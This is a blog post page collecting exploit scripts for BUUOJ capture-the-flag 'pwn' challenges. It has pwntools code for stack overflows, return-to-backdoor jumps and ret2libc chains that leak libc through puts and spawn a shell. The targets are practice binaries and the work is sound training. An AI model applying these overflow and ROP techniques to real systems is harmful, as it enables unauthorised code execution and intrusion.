<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="This article will record some poc for buuoj pwn .">
<meta property="og:type" content="article">
<meta property="og:title" content="buuoj pwn">
<meta property="og:url" content="http://example.com/2022/10/24/buuoj-pwn/index.html">
<meta property="og:site_name" content="书鱼">
<meta property="og:description" content="This article will record some poc for buuoj pwn .">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/10/24/buuoj-pwn/2.png">
<meta property="og:image" content="http://example.com/2022/10/24/buuoj-pwn/3.png">
<meta property="og:image" content="http://example.com/2022/10/24/buuoj-pwn/1.png">
<meta property="og:image" content="http://example.com/2022/10/24/buuoj-pwn/4.png">
<meta property="article:published_time" content="2022-10-23T18:57:49.000Z">
<meta property="article:modified_time" content="2022-11-07T10:53:56.160Z">
<meta property="article:author" content="Bkfish">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/10/24/buuoj-pwn/2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>buuoj pwn</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/10/25/pwn-bypass/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/10/23/pwn-fmt/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/24/buuoj-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/24/buuoj-pwn/&text=buuoj pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/24/buuoj-pwn/&is_video=false&description=buuoj pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuoj pwn&body=Check out this article: http://example.com/2022/10/24/buuoj-pwn/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/24/buuoj-pwn/&name=buuoj pwn&description=&lt;p&gt;This article will record some poc for buuoj pwn .&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/24/buuoj-pwn/&t=buuoj pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-overflow"><span class="toc-number">1.</span> <span class="toc-text">Stack overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rip"><span class="toc-number">1.1.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">1.2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">1.3.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">1.4.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">1.5.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">1.6.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">1.7.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ogeek2019-babyrop"><span class="toc-number">1.8.</span> <span class="toc-text">ogeek2019_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-number">1.9.</span> <span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">1.10.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-babyrop"><span class="toc-number">1.11.</span> <span class="toc-text">HarekazeCTF2019_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.12.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">1.13.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">1.14.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trsx-2018-rop"><span class="toc-number">1.15.</span> <span class="toc-text">trsx_2018_rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">1.16.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">1.17.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">1.18.</span> <span class="toc-text">pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">1.19.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">1.20.</span> <span class="toc-text">HarekazeCTF2019_baby_rop2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">1.21.</span> <span class="toc-text">jarvisoj_level3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fmt"><span class="toc-number">2.</span> <span class="toc-text">Fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019-dwkj-pwn1"><span class="toc-number">2.1.</span> <span class="toc-text">2019_dwkj_pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">2.2.</span> <span class="toc-text">jarvisoj_fm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.1.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">3.2.</span> <span class="toc-text">ciscn_2019_n_8</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Migration"><span class="toc-number">4.</span> <span class="toc-text">Stack Migration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">4.1.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        buuoj pwn
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Bkfish</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-10-23T18:57:49.000Z" class="dt-published" itemprop="datePublished">2022-10-24</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Pwn/">Pwn</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>This article will record some poc for buuoj pwn .</p>
<span id="more"></span>


<!-- toc -->

<h2 id="Stack-overflow"><a href="#Stack-overflow" class="headerlink" title="Stack overflow"></a>Stack overflow</h2><h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><p><a href="stack/rip/pwn1" title="pwn1">attachment</a></p>
<p>find stackoverflow in main@gets<br><img src="/2022/10/24/buuoj-pwn/2.png"></p>
<p>and find system(“&#x2F;bin&#x2F;sh”)<br><img src="/2022/10/24/buuoj-pwn/3.png"></p>
<p>or use cyclic  calc overflow size fast</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/24/buuoj-pwn/1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pwndbg&gt; cyclic -l agaa</span><br><span class="line">23</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn1&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26641</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">fun_addr=<span class="number">0x000000000040118A</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">23</span>+p64(fun_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p><a href="stack/warmup_csaw_2016/warmup_csaw_2016" title="warmup_csaw_2016">attachment</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&quot;./warmup_csaw_2016&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26058</span>)</span><br><span class="line"></span><br><span class="line">fun_addr=<span class="number">0x0000000000400611</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">72</span>+p64(fun_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p><a href="stack/pwn1_sctf_2016/pwn1_sctf_2016" title="pwn1_sctf_2016">attachment</a><br>this is a c++ elf<br><img src="/2022/10/24/buuoj-pwn/4.png"><br>in fgets it has’t stackoverflow ,but in function replace is make “I” to “you”,so we can use this module to overflow </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./pwn1_sctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#print(sh.recv())</span></span><br><span class="line">success_addr=<span class="number">0x08048F13</span></span><br><span class="line">payload=<span class="string">b&quot;IIIIIIIIIIIIIIIIIIIIaaaa&quot;</span>+p32(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p><a href="stack/jarvisoj_level0/jarvisoj_level0" title="jarvisoj_level0">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./level0&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26346)</span></span><br><span class="line">success_addr=<span class="number">0x000000000040059A</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p><a href="stack/jarvisoj_level2/jarvisoj_level2" title="jarvisoj_level2">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26341)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0804847F&#x27;)</span></span><br><span class="line">system_addr=<span class="number">0x08048320</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0804a024</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+p32(system_addr)+<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p><a href="stack/ciscn_2019_c_1/ciscn_2019_c_1" title="ciscn_2019_c_1">attachment</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_c_1 --only &quot;pop|ret&quot;</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>remote_exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">sh=process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,25090)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x0000000000400B28</span></span><br><span class="line">ret_addr=<span class="number">0x4006b9</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0000000000400AEE&#x27;)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">leak_puts_got=u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,leak_puts_got)</span><br><span class="line">libcbase=leak_puts_got-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x58</span>+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>localexp（ubuntu16）:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0000000000400AEE&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x00000000004009a0</span></span><br><span class="line">ret_addr=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)+p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">leak_puts_got=u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_puts_got))</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+leak_puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()+leak_puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>tips libcsearch: <a target="_blank" rel="noopener" href="https://libc.rip/">https://libc.rip/</a></p>
<h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p><a href="stack/bjdctf_2020_babystack/bjdctf_2020_babystack" title="bjdctf_2020_babystack">attachment</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./bjdctf_2020_babystack&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,27765)</span></span><br><span class="line">backdoor=<span class="number">0x00000000004006EA</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(backdoor)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;100\n&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

